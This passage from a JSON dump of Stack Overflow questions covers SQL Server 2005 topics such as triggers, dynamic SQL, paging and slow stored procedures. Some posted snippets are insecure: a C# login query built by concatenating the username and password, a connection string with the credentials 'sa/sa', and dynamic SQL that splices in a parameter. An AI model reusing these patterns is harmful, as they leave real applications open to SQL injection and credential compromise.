href=\"http://en.wikipedia.org/wiki/SQL_Server_Management_Studio\" rel=\"nofollow\">SQL Server Management Studio</a>, we cannot seem to \"force\" that error to happen - the <code>UPDATE</code> happily works just fine.....</p>\n\n<p><strong>Update:</strong> some further investigation seems to indicate Linq-to-SQL behaves differently when going against SQL Server 2005 or 2008.</p>\n\n<ul>\n<li>with SQL Server <strong>2005</strong>, our dates get turned into: <code>Nov  4 2011 02:15:25PM</code>   </li>\n<li>with SQL Server <strong>2008</strong>, our dates get turned into: <code>2011-11-04 02:15:25PM</code>   </li>\n</ul>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":4586,"score":2,"question_id":704914,"title":"SQL Server - An error occurred while executing batch. Error message is: The directory name is invalid","body":"<p>Our database server had run out of disk space, after freeing up some disk space any query run in sql server management studio, with the results sent to grid view, resulted in this error:<br />\nAn error occurred while executing batch. Error message is: The directory name is invalid.</p>\n\n<p>When the results sent to text view the queries worked fine.  </p>\n\n<p>Does anyone know why this error occurs and how to get rid of it?</p>\n"},{"tags":["vb.net","sql-server-2005","setup","remote-connections"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":236,"score":0,"question_id":12644987,"title":"Creating setup in vb.net with sql server","body":"<p>Is there any possible way to create a setup in for my program written in vb.net using sql server as the backend.I have a module which creates the database code and i have also created a setup in vb.net for my project but i want this setup to run properly even in a system which doesnt have visual studio and sql server installed.I tried running it on a system which doesnt have both but the error i get is sql server 2005 doesn't allow remote connections in default settings,i tried changing some settings but nothing seems to work.Is it necessary for a server to be there for creating the database?</p>\n"},{"tags":["tsql","sql-server-2005","select","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12637774,"title":"T-SQL Parse text in select statement","body":"<p>I am currently working on a project to import data from one table to another. I am trying to parse a field that contains a FULLNAME into its parts LAST,FIRST,MI. The names are all in the format of \"LAST,FIRST MI\" I have written a stored procedure that correctly parses and returns the results as neccessary but I am unsure as to how to encorporate the stored procedure into a single select statement. For instance, current I have:</p>\n\n<pre><code>SELECT FULLNAME From UserInfo\n</code></pre>\n\n<p>and what I would like to have is something like this:</p>\n\n<pre><code>SELECT Last, First, MI from UserInfo\n</code></pre>\n\n<p>Currently my stored procedure takes the form of ParseName(FULLNAME, Last as OUTPUT, First as OUTPUT, MI as OUTPUT). How can I call this procedure and have the output variables split into 3 different columns?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","pagination"],"answer_count":3,"favorite_count":5,"up_vote_count":5,"down_vote_count":0,"view_count":1008,"score":5,"question_id":3747186,"title":"Best paging solution using SQL Server 2005?","body":"<p>What is the most efficient paging solution using SQL Server 2005 against a table with around 5,000-10,000 rows? I've seen several out there but nothing comparing them.</p>\n"},{"tags":["sql-server","performance","sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":2577,"score":4,"question_id":3995386,"title":"Query runs fast, but runs slow in stored procedure","body":"<p>I am doing some tests using the SQL 2005 profiler.</p>\n\n<p>I have a stored procedure which simply runs one SQL query.</p>\n\n<p>When I run the stored procedure, it takes a long time and performs 800,000 disk reads.</p>\n\n<p>When I run the same query separate to the stored procedure, it does 14,000 disk reads.</p>\n\n<p>I found that if I run the same query with OPTION(recompile), it takes 800,000 disk reads.</p>\n\n<p>From this, I make the (possibly erroneous) assumption that the stored procedure is recompiling each time, and that's causing the problem.</p>\n\n<p>Can anyone shed some light onto this? </p>\n\n<p>I have set ARITHABORT ON. (This solved a similar problem on stackoverflow, but didn't solve mine)</p>\n\n<p>Here is the entire stored procedure:</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[GET_IF_SETTLEMENT_ADJUSTMENT_REQUIRED]\n @Contract_ID int,\n @dt_From smalldatetime,\n @dt_To smalldatetime,\n @Last_Run_Date datetime\nAS\nBEGIN\n DECLARE @rv int\n\n\n SELECT @rv = (CASE WHEN EXISTS\n (\n  select * from \n  view_contract_version_last_volume_update\n  inner join contract_version\n  on contract_version.contract_version_id = view_contract_version_last_volume_update.contract_version_id\n  where contract_version.contract_id=@Contract_ID\n  and volume_date &gt;= @dt_From\n  and volume_date &lt; @dt_To\n  and last_write_date &gt; @Last_Run_Date\n )\n THEN 1 else 0 end)\n\n -- Note that we are RETURNING a value rather than SELECTING it.\n -- This means we can invoke this function from other stored procedures\n return @rv\nEND\n</code></pre>\n\n<p>Here's a script I run that demonstrates the problem:</p>\n\n<pre><code>DECLARE \n @Contract_ID INT,\n @dt_From smalldatetime,\n @dt_To smalldatetime,\n @Last_Run_Date datetime,\n    @rv int\n\n\nSET @Contract_ID=38\nSET @dt_From='2010-09-01'\nSET @dt_To='2010-10-01'\nSET @Last_Run_Date='2010-10-08 10:59:59:070'\n\n\n-- This takes over fifteen seconds\nexec GET_IF_SETTLEMENT_ADJUSTMENT_REQUIRED @Contract_ID=@Contract_ID,@dt_From=@dt_From,@dt_To=@dt_To,@Last_Run_Date=@Last_Run_Date\n\n-- This takes less than one second!\nSELECT @rv = (CASE WHEN EXISTS\n(\n select * from \n view_contract_version_last_volume_update\n inner join contract_version\n on contract_version.contract_version_id = view_contract_version_last_volume_update.contract_version_id\n where contract_version.contract_id=@Contract_ID\n and volume_date &gt;= @dt_From\n and volume_date &lt; @dt_To\n and last_write_date &gt; @Last_Run_Date\n)\nTHEN 1 else 0 end)\n\n\n-- With recompile option. Takes 15 seconds again!\nSELECT @rv = (CASE WHEN EXISTS\n(\n select * from \n view_contract_version_last_volume_update\n inner join contract_version\n on contract_version.contract_version_id = view_contract_version_last_volume_update.contract_version_id\n where contract_version.contract_id=@Contract_ID\n and volume_date &gt;= @dt_From\n and volume_date &lt; @dt_To\n and last_write_date &gt; @Last_Run_Date\n)\nTHEN 1 else 0 end) OPTION(recompile)\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12614877,"title":"Table stuck when delete matching records within another table","body":"<p>I have a <strong>table A</strong> having around 15 millions of records. I have a process which delete and insert data into <strong>table A</strong> from another temp <strong>table B</strong>.</p>\n\n<p>It was working good and another user does not access this <strong>table A</strong> directly. The process scenario is - \n1) delete all matching records from <strong>table A</strong> with <strong>table B</strong>. \n2) Insert new fresh data into <strong>table A</strong> from <strong>table B</strong>.</p>\n\n<p>But sometime process is going to stuck. I have checked it but did not get any solution. </p>\n\n<p>A) So, I have created new table in place of <strong>table A</strong> and fetch the old data into new table from <strong>table A</strong>. After sometime, I got the same issue with new table.</p>\n\n<p>B) Next time, I have created another table in place of <strong>table A</strong> but did not insert old records in this table. Now, process is working fine. </p>\n\n<p>But I need a solution to put all records in the <strong>table A</strong>. \n<strong>Please,Can anybody help on it?</strong></p>\n\n<p>I'm using <strong>SQL Server 2005 Enterprise version</strong>. This process is done via <strong>store procedure</strong>. Table does not have any index. There is only simply delete and insert only. </p>\n"},{"tags":["java","sql-server-2005","database-connection","tcp-ip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":185,"score":0,"question_id":12496045,"title":"Error:The TCP/IP connection to the host has failed. java.net.ConnectException: Connection refused: connect ","body":"<p>I am using</p>\n\n<ul>\n<li>Windows 7  </li>\n<li>Netbeans IDE 7.1.2  </li>\n<li>SQL Server Management Studio Express 2005  </li>\n<li>JDK1.6</li>\n</ul>\n\n<p>I am getting the below error while connecting to the database:</p>\n\n<blockquote>\n  <p>com.microsoft.sqlserver.jdbc.SQLServerException: The TCP/IP connection to the host  has failed. java.net.ConnectException: Connection refused: connect  </p>\n</blockquote>\n\n<p>My connection string is: </p>\n\n<pre><code>Class.forName(\"com.microsoft.sqlserver.jdbc.SQLServerDriver\");  \nConnection connection = DriverManager.getConnection(  \n    \"jdbc:sqlserver://127.0.0.1:1433;databaseName=dbcm;\" +  \n    \"user=sa;password=sa\");\n</code></pre>\n\n<p>I've checked below things:  </p>\n\n<ol>\n<li>In SQL Server Configuration Manager, Protocols for SQLEXPRESS : TCP/IP Enabled\nIn fact I made enable remaining 3 too.  </li>\n<li>SQL Server(SQLExpress) and SQL Browser Service both are running.</li>\n</ol>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":11288850,"title":"Create trigger for automatically inserting another record when a condition is matched for the record inserted","body":"<p>I have 2 tables Headers and details, header stores the headers and the details stores the product and quantity.\nI want to add a product B with the same quantity when product A is inserted in order with the same quantity as of product A, and also update the headers table using triggers.</p>\n\n<p>Please help</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","service-broker"],"answer_count":5,"favorite_count":5,"up_vote_count":15,"down_vote_count":0,"view_count":1668,"score":15,"question_id":507721,"title":"Is anyone using the Service Broker in SQL Server?","body":"<p>When I attended a presentation of SQL Server 2008 at Microsoft, they did a quick gallup to see what features we were using. It turned out that in the entire lecture hall, my company was the only one using the Service Broker. This surprised me a lot, as I thought that more people would be using it.</p>\n\n<p>My experience with SB is that it does it's job well, but is pretty tough to administer and it's hard to get an overview. </p>\n\n<p>So, have you considered using the Service Broker? If not, why not? Did you go for MSMQ instead? Is there anything in SQL Server 2008 that would make you consider using the Service Broker.</p>\n"},{"tags":["sql-server","string","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12647808,"title":"Why subquery inside recursive string concatenation always returns NULL?","body":"<p>Suppose I have two tables:</p>\n\n<ul>\n<li>TABLE1: Has a list of IDs I need to process.</li>\n<li>TABLE2: Has key-value pairs of ID's and values.</li>\n</ul>\n\n<p>I need to retrieve the values from TABLE2 for all the IDs in TABLE1, as a single string. In order to achieve this, I made the next query:</p>\n\n<pre><code>DECLARE @id INT, @value VARCHAR(10);\n\nSELECT @id=0, @value='';\n\nSELECT\n    @value = @value + (SELECT TOP 1 value FROM TABLE2 WHERE id=@id) + '-',\n    @id = @id+1\nFROM TABLE1\n</code></pre>\n\n<p>But when I run this query, the subquery always returns null (and, therefore, <code>@value=NULL</code> at the end). My question is: Why does the subquery <code>SELECT TOP 1 value FROM TABLE2 WHERE id=@id</code> always returns NULL, even if the ID is found in TABLE2?</p>\n"},{"tags":["sql","tsql","sql-server-2005","boolean"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12646063,"title":"boolean expression with min/max in nullif possible?","body":"<p>is it possible to put a boolean expression with max or min into a nullif() statemtent?</p>\n\n<p>for example</p>\n\n<pre><code>select \n    min(a) as b ---grabbing first value\n    ,max(a) as  c --- grabbing last value but could be same as min value, this is the problem\n    ,nullif(min(a), (min(a) = max(a))) ---my idea for a solution that didnt work\n   from table\n</code></pre>\n\n<p>trying to weed out duplicate rows when a field has a value that only happens 1 time.  I am thinking there may be a way to do this with counting and then weeding out all values with a value over 1 but am not sure how to accomplish that. working on sql server 2005, need this in t-sql if possible, anything that will work on the server is ok though. </p>\n\n<p>edit to provide more info: \ni am looking at a status history for orders in an order management system that tags each time a correction is requested with an id.  the id's are unique and numerical. in this format 1234  each orderid is unique and numerical as well in this format 1111111.2. a represents the unique correction id.  I want to look at the order, and if one correction id has already happened to grab the next one ideally, and the next after that and so on if possible. At very minimum i would want the MAX value and MIN value. i cannot just do two columns because that would count the min value twice (using my example) and will not give me accurate data</p>\n\n<p>was trying to be simple with my example but its not providing enough info, here is more:</p>\n\n<pre><code>SELECT Cast(oi.orderid AS VARCHAR(MAX)) + '.' \n                 + Cast(oi.orderitemid AS VARCHAR(MAX)) AS OrderNumber,\n       Min(oici.orderitemcorrectionid)                  AS a,\n       Max(oici.orderitemcorrectionid)                  AS b\nFROM   Orderitems oi\n       LEFT JOIN orderitemcorrections oic\n         ON oic.orderid = oi.orderid\n            AND oic.orderitemid = oi.orderitemid\n       LEFT JOIN orderitemcorrectionissues oici\n         ON oici.orderitemcorrectionid = oic.orderitemcorrectionid\n       LEFT JOIN correctiontypes ct\n         ON ct.correctiontypeid = oici.correctiontypeid\nGROUP  BY Cast(oi.orderid AS VARCHAR(MAX)) + '.' \n                   + Cast(oi.orderitemid AS VARCHAR(MAX)) \n</code></pre>\n\n<p>sample table data of above query:</p>\n\n<pre><code>OrderNumber a   b\n1098048.1   1   2\n1098210.1   160 160\n1098222.1   78  78\n1098300.1   31  31\n1098408.1   4   4\n1098462.1   224 224\n1098468.1   602 602\n1098492.2   1457 1457\n</code></pre>\n\n<p>above is data where a and b are the same\nbelow is where they are different but i want to null any duplicates from a to b</p>\n\n<pre><code>1100268.1   181 191\n1100256.1   306 379\n</code></pre>\n\n<p>more data, not grouped to show duplicates for rows. -- sample raw data</p>\n\n<pre><code>OrderNumber orderitemcorrectionid\n1098048.1   1\n1098048.1   2\n1098210.1   160\n1098210.1   160\n</code></pre>\n"},{"tags":["sql-server-2005","triggers"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":195,"score":1,"question_id":9195495,"title":"How do I see the NTusername in trigger?","body":"<p>SQL Server Profiler shows NtUsername.\nHow do I see the NTusername in trigger?</p>\n\n<p>I don't understand. SQL Server Profiler shows the Windows username. SUSER_NAME, SUSER_SNAME ORIGINAL_LOGIN, USER, USER_NAME shows the username of the SQL user account. I want what the Profiler is showing. There must be a way if the profiler can do it.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12642246,"title":"deleted value of the after delete trigger","body":"<p>I've got problems with my triggers (add and delete):</p>\n\n<pre><code>ALTER TRIGGER [trgAfterShoppingInserted]\nON [ShopingList] AFTER INSERT \nAS BEGIN\n   DECLARE @cardId char(6), @points int, @userId int\n\n   SET @cardId = (SELECT cardId FROM inserted)\n   SET @points = (SELECT points FROM inserted)\n   SET @userId = (SELECT userId from [Card] WHERE id = @cardId)\n   IF @userId = 0\n   BEGIN\n   Update [Card]\n   set points = points + @points\n   where id =@cardId\n   END\n   ELSE\n   Update [Card]\n   set points = points + @points\n   where id =@cardId OR\n   userId = @userId\nEND\n\n\nALTER TRIGGER [trgAfterShoppingDeleted]\nON [ShopingList] AFTER DELETE \nAS BEGIN\n   DECLARE @cardId char(6), @points int, @userId int\n\n   SET @cardId = (SELECT cardId FROM inserted)\n   SET @points = (SELECT points FROM inserted)\n   SET @userId = (SELECT userId from [Card] WHERE id = @cardId)\n   IF @userId = 0\n   BEGIN\n   Update [Card]\n   set points = points - @points\n   where id =@cardId\n   END\n   ELSE\n   Update [Card]\n   set points = points - @points\n   where id =@cardId OR\n   userId = @userId\nEND\n</code></pre>\n\n<p>The problem is on the <code>SET @cardId..</code></p>\n\n<p>The error is:</p>\n\n<blockquote>\n  <p><em>Subquery returned more than 1 value. This is not permitted when the subquery follows =, !=, &lt;, &lt;= , >, >= or when the subquery is used as an expression.</em></p>\n</blockquote>\n\n<p>how is it possibile ?</p>\n\n<p>thanks for any help</p>\n"},{"tags":["sql-server-2005","tsql","stored-procedures","full-text-search"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":123,"score":1,"question_id":5605097,"title":"COALESCE together with FTS","body":"<p>I have a form that has a 'brand' dropdown and a 'model' dropdown.I am searching for cars here that has some brand and/or a model.\nNow if I choose \"all\" from the 'brand' dropdown and some 'model' value other then the \"all\" ,I use </p>\n\n<blockquote>\n  <p>COALESCE(@brand,cars.brand)</p>\n</blockquote>\n\n<p>and </p>\n\n<blockquote>\n  <p>COALESCE(@model,cars.model)</p>\n</blockquote>\n\n<p>, it works fine as in returning all the cars if I choose \"all\" for both the dropdown menus and specific results if I choose some value.\nNow I want to use FTS with the <code>CONTAINS</code> keyword and using a query like </p>\n\n<pre><code>CONTAINS(cars.model , 'COALESCE(@model,cars.model)')\n</code></pre>\n\n<p>is returning with an error as </p>\n\n<blockquote>\n  <p>Syntax error near '(' in the full-text search condition 'COALESCE(@model,cars.model)'.</p>\n</blockquote>\n\n<p>I would really appreciate if someone can refer me to a query/sproc that is FTS together with COALESCE .Please help.\nP.S </p>\n\n<pre><code>SET @SQL = '\nSET @query_result = ( \n    SELECT items.id AS \"ID\"\n            ,items.title AS \"Title\"\n            ,cars.brand AS \"Brand\"\n            ,cars.model AS \"Model\"\n            ,cars.type AS \"Type\"\n            ,items.city AS \"City\"\n            ,items.name AS \"Name\"\n            ,items.date_added AS \"Date\"\n            ,items.small_1 AS \"Image\"\n      FROM [cars]\n      JOIN [items] \n        ON items.id=cars.item_id\n     WHERE cars.item_id = COALESCE(@item_id,cars.item_id)\n            AND CONTAINS(cars.brand ,''COALESCE('+@brand+',cars.brand)'')\n            AND cars.model = COALESCE(@model,cars.model)\n            AND cars.type = COALESCE(@type,cars.type)\n            AND items.city = COALESCE(@city,items.city)\n            AND DATEDIFF(DAY,items.date_added,GETDATE())&lt;=COALESCE(@period,items.date_added)\n            AND items.new = COALESCE(@isnew,items.new)\n       FOR XML\n      PATH(''car''),ROOT(''items''))'\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","dynamic-sql"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":2496,"score":6,"question_id":3840730,"title":"Getting result of dynamic SQL into a variable","body":"<p>Executing dynamic SQL as follows in Stored Procedure:</p>\n\n<pre><code>DECLARE @sqlCommand nvarchar(1000)\nDECLARE @city varchar(75)\nSET @city = 'London'\nSET @sqlCommand = 'SELECT COUNT(*) FROM customers WHERE City = @city'\nEXECUTE sp_executesql @sqlCommand, N'@city nvarchar(75)', @city = @city\n</code></pre>\n\n<p>How do I use the count(*) column value as return value in the SP?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":12639339,"title":"Any chance to recover unicode data from varchar column","body":"<p>Unicode data (cyrillic) was written into database column of type <code>varchar</code></p>\n\n<p>Is there any chance to recover that data in correct format?</p>\n\n<p>It doesn't have to be fully recovered, anything will be great</p>\n\n<p>Thanks for any help</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":8273,"score":6,"question_id":547074,"title":"SQL Server: How do I add a constraint to an existing table but only if the constraint does not already exist?","body":"<p>I need to add a constraint to an existing SQL server table but only if it does not already exist.</p>\n\n<p>I am creating the constraint using the following SQL.</p>\n\n<pre><code>ALTER TABLE [Foo] ADD CONSTRAINT [FK_Foo_Bar] FOREIGN KEY ([BarId]) REFERENCES [Bar] ([BarId]) ON UPDATE CASCADE ON DELETE CASCADE\n</code></pre>\n\n<p>I'm hoping I can add some SQL to the begining of the SQL to test for the existence of the constraint but I have no idea how.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12639030,"title":"Get the list of stored procedures created and / or modified on a particular date?","body":"<p>I want to find which stored procedure I've created and also I want to find which stored procedure I've modified in my SQL Server on a particular date like 27 september 2012 (27/09/2012).</p>\n\n<p>Is there any query which will list these procedures that are created and also modified on this date?</p>\n\n<p>Thanks in advance</p>\n\n<p>Regards\nAmit Vyas</p>\n"},{"tags":["sql","sql-server-2005","rollback"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12383137,"title":"MS SQL 2005- Rollback Update query","body":"<p>I'm using MS SQL Server 2005 enterprise edition. I executed an update query to get affect a record in a row and a column. </p>\n\n<pre><code>update HS_SM_USERACCOUNT \nset ACCOUNTPOLICYTYPE=1  \nwhere EMP_NUMBER='000540' and USERID='03510410@' \n</code></pre>\n\n<p>Earlier the column called <code>ACCOUNTPOLICYTYPE</code> is holding value <code>1</code> for that particular condition in WHERE clause. Now I want to get the previous state without executing Update Query again.</p>\n\n<p>Will <code>ROLLBACK</code> help me? Please help me on this. </p>\n"},{"tags":["sql-server-2005","vb6"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":1267002,"title":"Table access query","body":"<p>In our server client software in vb6 with SQL2005, On server side one SQL table is continuously updated by data and we need to display data from this same table on client at running time. Pleases help how to access this same table from server and client so that data is continuously updated from server side and records in this table show on client software without error. </p>\n"},{"tags":["sql-server-2005","propel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12635196,"title":"Propel, Having fields with spaces","body":"<p>Is it possible to have a space in the field name that is defined in the schema.xml?</p>\n\n<p><em>The bright spark who design</em> the database, used field names like 'POST CODE' and 'CURRENT'       </p>\n\n<p>Is there a way around this? or am i stuck?        </p>\n\n<blockquote>\n  <p>The database is an existing MSSQL 2005 database, with an <em>unknown</em>\n  number of systems connected to it. So it cannot be changed.</p>\n  \n  <p>I am using the reverse command to generate the schema.xml</p>\n\n<pre><code>propel-gen . reverse\n</code></pre>\n</blockquote>\n\n<p>Propel 1.6.7</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1131,"score":0,"question_id":3137647,"title":"Using SQL Server Management Studio Express to Backup DB","body":"<p>I am wanting to backup a SQl Server 2005 db at a remote site (ie. to ultimately have a backup file of the db here locally on my machine).</p>\n\n<p>Can this be done using SQL Server Management Studio Express ? I have this installed and running.. but cannot seem to find a way of backing up using it. \nIf this isn't possible, how do I create a backup of my remote db some other way ?</p>\n\n<p>Thank you,</p>\n\n<p>Bazza</p>\n"},{"tags":["sql-server-2005","reporting-services","reportingservices-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":860,"score":3,"question_id":655435,"title":"SSRS 2005 Report Automatically Rendering","body":"<p>I have created a number of SSRS 2005 reports, and provided a number of parameters for each. Each of the parameters have default values, and therefore the report automatically renders when someone visits the report through the SSRS web site. </p>\n\n<p>What I'd like to do is have all the reports have their default values, but prevent the report from automatically rendering. I've looked online, and I haven't seen anything aside from people claiming that it cannot be done. I'm hoping to see some expert advice on this one for a method of preventing the reports from automatically rendering without having to develop a custom web interface.</p>\n\n<p>Any thoughts?</p>\n\n<p>Does anyone know if this behavior is different in SSRS 2008?</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12614911,"title":"How can I migrate a SQL Server 2005 database to SQL Server 2008?","body":"<p>I am trying to migrate my one SQL Server 2005 database to SQL Server 2008, with various option, like Script Database.</p>\n\n<p>I am able to create table structure but without any objects like data, functions, stored procedure.... </p>\n\n<p>How can I do this? I tried to copy <code>.mdf</code> and <code>.ldf</code> file and put them into 2008 folder, but this is also not working.</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12626334,"title":"Select Query Error","body":"<p>I want to create a login account  by matching UserName &amp; Password. I want to save the result in a local variable named as result. When a user logs in, the result should be one, but it always returning -1. My code is following......</p>\n\n<pre><code>    protected void LoginBtn_Click(object sender, EventArgs e)\n    {\n        string Name = nameTextBox.Text;\n        string Password = passwordTextBox.Text;\n        nameTextBox.Text = \"\";\n        passwordTextBox.Text = \"\";\n        string connectionstring = @\"Integrated Security=True;Initial Catalog=HMIS;Data Source=.\\SQLEXPRESS\";\n        SqlConnection connection = new SqlConnection(connectionstring);\n        connection.Open();\n        string selectquery = \"Select ID from  UsersInfo where UserName='\" + @Name+ \"' and Password='\" + @Password + \"'\";\n        SqlCommand cmd = new SqlCommand(selectquery, connection);\n        cmd.Parameters.AddWithValue(\"@UserName\", Name);\n        cmd.Parameters.AddWithValue(\"@Password\", Password);\n         //object result = cmd.ExecuteNonQuery();\n        //if (result != null)\n        int result = (int)cmd.ExecuteNonQuery();\n        if (result &gt; 0) \n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","like-operator"],"answer_count":5,"favorite_count":3,"up_vote_count":13,"down_vote_count":0,"view_count":1855,"score":13,"question_id":5754934,"title":"LIKE with integers, in SQL","body":"<p><strong>Can I replace</strong> the  <code>=</code>  statement with the <code>LIKE</code> one for the integers <strong>?</strong></p>\n\n<p>by eg. are the following the same thing:</p>\n\n<pre><code>select * from FOOS where FOOID like 2    \n// and \nselect * from FOOS where FOOID = 2\n</code></pre>\n\n<p>I'd prefer to use <code>LIKE</code> instead of <code>=</code> because I could use <code>%</code> when I have no filter for FOOID...</p>\n\n<p>SQL Server 2005.</p>\n\n<p><strong>EDIT 1 @Martin</strong><br>\n<img src=\"http://i.stack.imgur.com/gBlYC.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["sql","sql-server-2005","debugging","ssis","watch"],"answer_count":2,"favorite_count":4,"up_vote_count":20,"down_vote_count":0,"view_count":19785,"score":20,"question_id":582166,"title":"Watching variables in SSIS during debug","body":"<p>I have a project in SSIS and I've added an Execute SQL Task which sends its result out to a variable. I wanted to confirm the value because I was worried that it would try to write it out as a resultset object rather than an actual integer (in this case I'm returning a COUNT).</p>\n\n<p>My first thought was just to run it in debug mode and add the global variable to my Watch window. Unfortunately, when I right-click on the Watch window, the option to \"Add Variable\" is greyed out. What am I missing here?</p>\n\n<p>I've gotten around confirming that my variable is set correctly, so I'm not interested in methods like putting a script in to do a MsgBox with the value or anything like that. For future reference I'd like to be able to watch variables in debug mode. If there are some kind of constraints on that then I'd like to know the what and why of it all if anyone knows.</p>\n\n<p>The help is woefully inadequate on this one and every \"tutorial\" that I can find just says, \"Add the variable to the Watch window and debug\" as though there should never be a problem doing that.</p>\n\n<p>Thanks for any insight!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":5,"up_vote_count":10,"down_vote_count":0,"view_count":22213,"score":10,"question_id":595762,"title":"Calculate execution time of a SQL query?","body":"<p>I am providing search functionality in my website, when user searches a record then I want to display the time the query taken to get the results same as google does. When we search anything then google displays how much time it takes to get results?</p>\n\n<p>For this I have declared a @start variable in my SP and finding the difference in the end, as below;</p>\n\n<pre><code>DECLARE @start_time DATETIME\n\nSET @start_time = GETDATE()\n\n-- my query\nSELECT * FROM @search_temp_table\n\nSELECT RTRIM(CAST(DATEDIFF(MS, @start_time, GETDATE()) AS CHAR(10))) AS 'TimeTaken'\n</code></pre>\n\n<p>Is there any other easy and fast way, or a single line of query with which we can find out the time a query taken to execute?</p>\n\n<p>I'm using SQL2005.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12623315,"title":"sql statement insert into with select?","body":"<p>I have a table with columns:</p>\n\n<pre><code>StudentID\nValue1\nValue2\nValue3\n</code></pre>\n\n<p>...and I have three queries, each one will come with the studentID and a value(1 to 3) fields</p>\n\n<p>What I would like to do is to update this table, with parallel values, if a student exists then update the corresponding column if not, create a new row.</p>\n\n<p>I'm working with SQL Server 2005</p>\n"},{"tags":["sql","sql-server-2005","refactoring"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12623167,"title":"Removing duplication in dynamic ROW_NUMBER() OVER ORDER BY statement","body":"<p>I have the following snippet from a SQL statements</p>\n\n<pre><code>ROW_NUMBER() OVER (ORDER BY CASE\n    WHEN @SortBy = 'column1 ASC' THEN cast(column1 AS sql_variant)\n    WHEN @SortBy = 'column2 ASC' THEN cast(column2 AS sql_variant)\n    WHEN @SortBy = 'column3 ASC' THEN cast(column3 AS sql_variant)\n    WHEN @SortBy = 'column4 ASC' THEN cast(column4 AS sql_variant)\n    ELSE NULL\nEND ASC,\nCASE\n    WHEN @SortBy = 'column1 DESC' THEN cast(column1 AS sql_variant)\n    WHEN @SortBy = 'column2 DESC' THEN cast(column2 AS sql_variant)\n    WHEN @SortBy = 'column3 DESC' THEN cast(column3 AS sql_variant)\n    WHEN @SortBy = 'column4 DESC' THEN cast(column4 AS sql_variant)\n    ELSE NULL\nEND DESC) AS RowNumber\n</code></pre>\n\n<p>It works, but it's quite repetitive, is there a way to make the ASC/DESC dynamic as well, so I don't need the duplicated <code>CASE</code> statement?</p>\n"},{"tags":["tsql","sql-server-2005","merge"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12621241,"title":"Can I use the MERGE statement in SQL Server 2005?","body":"<p>I am using SQL Server 2005 and I wanted to create MERGE statement or concept in single query in SQL Server 2005. Is it possible?</p>\n"},{"tags":["sql","sql-server-2005","reporting-services","reportingservices-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":11882562,"title":"SQL SSRS Report Builder - cannot see views only tables?","body":"<p>I am using SSRS Report Builder with SQL 2005 and I am trying to build some reports from my data sources.  </p>\n\n<p>However when I bring up the data source entities it is only showing tables not views which is what I want to use to make the coding neater and easy to use.  </p>\n\n<p>Am I missing something?  Can anyone advise a way to get the views to be shown up in the Entities options?</p>\n\n<p>Any help much appreciated.</p>\n\n<p>Thanks,</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","thread-safety"],"answer_count":5,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":1482,"score":6,"question_id":1483383,"title":"Is this stored procedure thread-safe? (or whatever the equiv is on SQL Server)","body":"<p>With the help of others on SO I've knocked up a couple of Tables and Stored Procedures, this morning, as I'm far from a DB 